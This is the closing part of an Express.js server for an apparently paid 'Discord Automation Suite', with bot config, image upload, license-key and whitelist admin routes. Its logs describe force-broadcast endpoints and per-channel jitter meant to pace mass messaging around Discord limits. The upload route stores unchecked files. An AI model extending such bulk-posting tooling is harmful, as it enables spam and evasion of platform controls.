    const c = db.getConfig(req.user.id, configId);
    if (c) { c.active = 0; db.setConfig(req.user.id, c, configId); }
    clearBotStats(botKey);
    res.json({ success: true });
  } catch(err) { res.status(500).json({ success: false, error: err.message }); }
});

app.post('/api/bot/delete', ensureAuthAPI, (req, res) => {
  try { const { configId } = req.body; db.deleteConfig(req.user.id, configId); res.json({ success: true }); }
  catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
  try {
    const { imageBase64 } = req.body;
    if (!imageBase64) return res.json({ success: false, error: 'No image provided' });
    const imageId = `img_${Date.now()}.png`;
    const imagePath = path.join(dataDir, 'uploads');
    if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
    const base64Data = imageBase64.split(',')[1];
    if (!base64Data) return res.status(400).json({ success: false, error: 'Invalid image data' });
    const buffer = Buffer.from(base64Data, 'base64');
    fs.writeFileSync(path.join(imagePath, imageId), buffer);
    res.json({ success: true, imageUrl: `/uploads/${imageId}`, imageId });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.use('/uploads', express.static(path.join(dataDir, 'uploads')));

// ═══════════════════════════════════════════════════════════════════════════════
// ADMIN ROUTES
// ═══════════════════════════════════════════════════════════════════════════════

app.get('/api/admin/keys', ensureCanGenerate, (req, res) => { const keys = db.getGeneratedKeys(); res.json({ success: true, keys }); });
app.post('/api/admin/keys/generate', ensureCanGenerate, (req, res) => {
  const { duration } = req.body;
  if (!duration || !['lifetime', '1h', '24h', '7d', '30d'].includes(duration)) return res.status(400).json({ success: false, error: 'Invalid duration' });
  let dbDuration = duration;
  if (duration === '7d') dbDuration = '168';
  if (duration === '30d') dbDuration = '720';
  const keyData = db.generateKey(dbDuration);
  res.json({ success: true, key: keyData });
});

app.post('/api/admin/keys/revoke', ensureOwner, (req, res) => {
  const { key } = req.body;
  if (!key) return res.status(400).json({ success: false, error: 'No key provided' });
  const success = db.revokeKey(key);
  res.json({ success });
});

app.get('/api/admin/whitelist', ensureOwner, (req, res) => { res.json({ success: true, whitelist: db.getWhitelist() }); });
app.post('/api/admin/whitelist/add', ensureOwner, (req, res) => { const { userId } = req.body; if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' }); db.addToWhitelist(userId); res.json({ success: true }); });
app.post('/api/admin/whitelist/remove', ensureOwner, (req, res) => { const { userId } = req.body; if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' }); db.removeFromWhitelist(userId); res.json({ success: true }); });

// ═══════════════════════════════════════════════════════════════════════════════
// STATIC & FALLBACK ROUTES
// ═══════════════════════════════════════════════════════════════════════════════

app.get('/', (req, res) => { if (req.isAuthenticated()) return res.redirect('/dashboard'); res.redirect('/login'); });
app.get('/dashboard', (req, res) => { if (!req.isAuthenticated()) return res.redirect('/login'); res.sendFile(path.join(__dirname, 'public', 'overall.html')); });

app.use((err, req, res, next) => {
  console.error('[SERVER ERROR]', err);
  res.status(500).json({ error: err.message });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`[SERVER] Discord Automation Suite v3.5-FORCE running on port ${PORT}`);
  console.log(`[SERVER] FORCE SEND: /api/bot/force-send and /api/bot/force-broadcast enabled`);
  console.log(`[SERVER] FIXED: _getNextChannelFreeTime no longer compounds`);
  console.log(`[SERVER] FIXED: Delay loop always waits full configured delay`);
  console.log(`[SERVER] FIXED: Rate limits reset between rounds`);
  console.log(`[SERVER] FIXED: Reduced stagger 350ms->100ms, queue 400ms->200ms`);
  console.log(`[SERVER] FIXED: Removed redundant double-wait in sendMessage`);
  console.log(`[SERVER] Per-channel delay: ${RL_MIN_CHANNEL_DELAY}ms + ${RL_PER_CHANNEL_JITTER * 100}% jitter, max ${RL_MAX_CHANNEL_DELAY}ms`);
  console.log(`[SERVER] 429 backoff: ${RL_429_BACKOFF_BASE}ms base, exponential up to ${RL_429_BACKOFF_MAX}ms`);
});

module.exports = app;
app.db = db;
app.activeBots = activeBots;
